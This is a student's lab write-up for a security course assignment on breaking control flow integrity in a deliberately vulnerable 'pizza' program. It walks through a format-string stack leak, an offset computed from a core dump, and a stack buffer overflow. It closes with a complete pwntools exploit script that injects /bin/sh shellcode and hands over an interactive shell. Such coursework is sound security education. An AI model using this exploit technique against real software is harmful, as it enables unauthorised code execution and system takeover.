# Assignment 10
The goal of this assignment was to learn about control flow integrity and how to break it. I did this by using pwntools, a python library designed to exactly this. To do this we took a poorly made ,at least as far as security is concerned, program that allowed user to input data that wasn't properly checked. 

## Process
The first thing we had to do was determine what we could do to the program to break it. To do this I started off by just trying to over flow the buffers for input. There was 2 locations I was able to overflow and cause a segmentation fault, the name and the credit card input for the progam.

![image](https://github.com/Novaii-Yoder/CS579/assets/52936757/3cd84b7c-498e-4497-8a8d-ffdba1d527b9)

So now we know we can input our shellcode into the input and overwrite return addresses to call the shellcode, but the hard part now is finding where to overwrite the return address and what address to overwrite it with. The way I did this was by getting the program to leak an address to the stack, this way I could find an offset and use that to get the code to run. This can be done in the pizza program by feeding it a string of `%p` because of the way the program was written. The pizza program uses something like sprintf, or printf in the code which allows us to use format specifiers in our string input. This is really bad practice because when you pass too many specifiers and not enough input you get undefined behavior which opens your program to attacks. Because of our format specifiers '%p' we can print what ever is on that stack as pointers to the screen, so we just print a few untill we see a pointer that leads to the stack.

![image](https://github.com/Novaii-Yoder/CS579/assets/52936757/0dffaf51-392c-42f9-896f-64b95773e856)

Now that we've leaked pointers we just have to determine which one to use and create an offset. Because of randomize stack locations we cant hardcode a return address to our shellcode, because everytime the program runs it would be different. So we have to to find the offset from one of the leaked pointers. I did this by using the corefiles that the cpu dumps when it crashes, so all I had to do was crash the program, which we already discovered how to do. After crashing the program I used the core file and pwntools to open it and view pointers and the stack. I used the stackpointer at the time of the crash and printed the stack around that pointer to get a glimpse of the stack.

![image](https://github.com/Novaii-Yoder/CS579/assets/52936757/ecbb3f33-2826-412b-a9cd-4b9c20f4746e)

In the image above you can see that I have already input the shellcode and crashed the program by following it with a bunch of A's. Using this glimpse into the stack we can determine 2 things: First, that the position of the stackpointer at the time of the crash is return address we want to replace. Second, we know where the adress of the shellcode is, so now we can calculate the offset.

To calculate the offset we just take the two stack address we found and subtract them from eachother. This will give us the number we need to add to the leaked address everytime we run the code and put into the return address. 
In this case we take:
    0x7ffe2c82e8e0
-   0x7ffe2c82e870
--------------------
    0x000000000070 => 112
So now we can but everything together and have the program leak addresses at runtime, and create the return address with the offset, then combine the the shellcode, a buffer of whatever, then finally the return address to the shellcode. Then we can run the program again and it will allow us to use the terminal.

![image](https://github.com/Novaii-Yoder/CS579/assets/52936757/77026007-490a-4063-a853-4191e27e16fc)

## Code
~~~python3
from pwn import *

# A simple function that takes a core file and prints the stack, it prints the number entered as the total lines and prints the lines around where the stack pointer was when the program crashed.
def print_stack(core, num=20):
    rsp = core.rsp
    print("Stack")
    x = num//2
    for i in range(x, 1, -1):
        tmp = rsp + 8 * i
        print(f"{tmp:x}\t{core.read(tmp, 8)}")

    print(f"{tmp:x}\t{core.read(rsp, 8)} <------- RSP")

    for i in range(1, x):
        tmp = rsp - 8 * i
        print(f"{tmp:x}\t{core.read(tmp, 8)}")



#### MAIN ####

# Executable and Linkable Format
elf = ELF("./pizza")

# Set the context in pwn to machine settings
context(arch='amd64', os='linux', endian='little', word_size=64)

# Get the addresses to function names
# getname_address = elf.symbols["getname"]
# print(hex(getname_address))

# Loads in pwn's shell code as assembly
shellcode = asm(shellcraft.amd64.linux.sh())

# Prints shellcode as assembly
# print(shellcraft.amd64.linux.sh())

# Prints shellcode as hex
# print(shellcode.hex().upper())

# Start the target process we will be breaking into 
victim = process("./pizza")

# First input tricks the program into printing stack and other locations
input1 = b"%p %p %p %p %p %p %p %p %p %p"

# Get the first line of output
print(str(victim.recvline(), "latin-1"))

# Send our "name" aka "%p %p.."
victim.sendline(input1)

# Get the response and parse it into getting the stackpointer
line = str(victim.recvline(), "latin-1")
print(line)
# Subtract the offset to the start of our shellcode
addr = int(line.split(" ")[7], 16) - 112
# Create our second input, which will have the shellcode, then a bunch of garbage until the return adress to the shell code.
input2 = shellcode + b"A"*88 + addr.to_bytes(8, 'little')


line = str(victim.recvline(), "latin-1")
victim.sendline(b"4")

# Send our shellcode 
victim.sendline(input2)

# Give the control back to us
# Now we have access to the computer as whoever ran ./pizza
victim.interactive()

victim.wait()

# This finds the corefile from a segfault and lets us parse it
# core = victim.corefile
# print_stack(core, 40)

# print(input2)
# print(disasm(core.read(core.rip,8))) # prints next instructions
exit()
~~~
